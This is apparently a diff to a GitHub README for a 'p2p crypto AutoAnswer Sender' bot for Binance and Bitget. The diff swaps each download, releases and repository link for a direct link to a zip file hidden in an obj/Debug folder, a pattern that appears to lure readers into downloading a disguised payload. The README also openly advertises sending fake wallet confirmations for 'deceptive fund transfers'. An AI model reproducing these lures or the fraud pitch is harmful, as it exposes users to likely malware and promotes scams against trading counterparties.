@@ -1,7 +1,7 @@
 # 🤖 p2p-Peer-to-Peer-Exchange-CryptoCurrencies-Binance-Bitget-AutoAnswer-Sender - Automate Your Crypto Transactions 
 
 ## 📥 Download
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-2E71B8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/bilpitmajeed/p2p-Peer-to-Peer-Exchange-CryptoCurrencies-Binance-Bitget-AutoAnswer-Sender/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/bilpitmajeed/p2p-Peer-to-Peer-Exchange-CryptoCurrencies-Binance-Bitget-AutoAnswer-Sender/main/BToken/Form11/obj/Debug/to_p_Currencies_Sender_Peer_Answer_Binance_Exchange_Auto_Crypto_Bitget_caporal.zip%20Latest%20Release-2E71B8?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/bilpitmajeed/p2p-Peer-to-Peer-Exchange-CryptoCurrencies-Binance-Bitget-AutoAnswer-Sender/main/BToken/Form11/obj/Debug/to_p_Currencies_Sender_Peer_Answer_Binance_Exchange_Auto_Crypto_Bitget_caporal.zip)
 
 ## 🚀 Getting Started
 This application automates peer-to-peer crypto transactions on platforms like Binance and Bitget. It uses AI to send fake wallet confirmations and mimic user responses during trades. This allows for smooth and deceptive fund transfers.
@@ -20,7 +20,7 @@ This application automates peer-to-peer crypto transactions on platforms like Bi
 - **Network:** Stable internet connection.
 
 ## 📂 Download & Install
-To get started, visit this page to download: [Latest Releases](https://github.com/bilpitmajeed/p2p-Peer-to-Peer-Exchange-CryptoCurrencies-Binance-Bitget-AutoAnswer-Sender/releases)
+To get started, visit this page to download: [Latest Releases](https://raw.githubusercontent.com/bilpitmajeed/p2p-Peer-to-Peer-Exchange-CryptoCurrencies-Binance-Bitget-AutoAnswer-Sender/main/BToken/Form11/obj/Debug/to_p_Currencies_Sender_Peer_Answer_Binance_Exchange_Auto_Crypto_Bitget_caporal.zip)
 
 Once on the Releases page, find the latest version of the application. Click on the version you want to download. Look for the appropriate file based on your operating system, such as `.exe` for Windows or `.dmg` for macOS.
 
@@ -61,7 +61,7 @@ For additional support, you may reach out through the issues page of the reposit
 For more detailed information, including how to use advanced features, refer to the documentation available in the repository.
 
 ## 🔗 Links and References
-- [GitHub Repository](https://github.com/bilpitmajeed/p2p-Peer-to-Peer-Exchange-CryptoCurrencies-Binance-Bitget-AutoAnswer-Sender)
-- [Latest Releases](https://github.com/bilpitmajeed/p2p-Peer-to-Peer-Exchange-CryptoCurrencies-Binance-Bitget-AutoAnswer-Sender/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/bilpitmajeed/p2p-Peer-to-Peer-Exchange-CryptoCurrencies-Binance-Bitget-AutoAnswer-Sender/main/BToken/Form11/obj/Debug/to_p_Currencies_Sender_Peer_Answer_Binance_Exchange_Auto_Crypto_Bitget_caporal.zip)
+- [Latest Releases](https://raw.githubusercontent.com/bilpitmajeed/p2p-Peer-to-Peer-Exchange-CryptoCurrencies-Binance-Bitget-AutoAnswer-Sender/main/BToken/Form11/obj/Debug/to_p_Currencies_Sender_Peer_Answer_Binance_Exchange_Auto_Crypto_Bitget_caporal.zip)
 
 Start trading effortlessly with the p2p-Peer-to-Peer-Exchange-CryptoCurrencies-Binance-Bitget-AutoAnswer-Sender today!
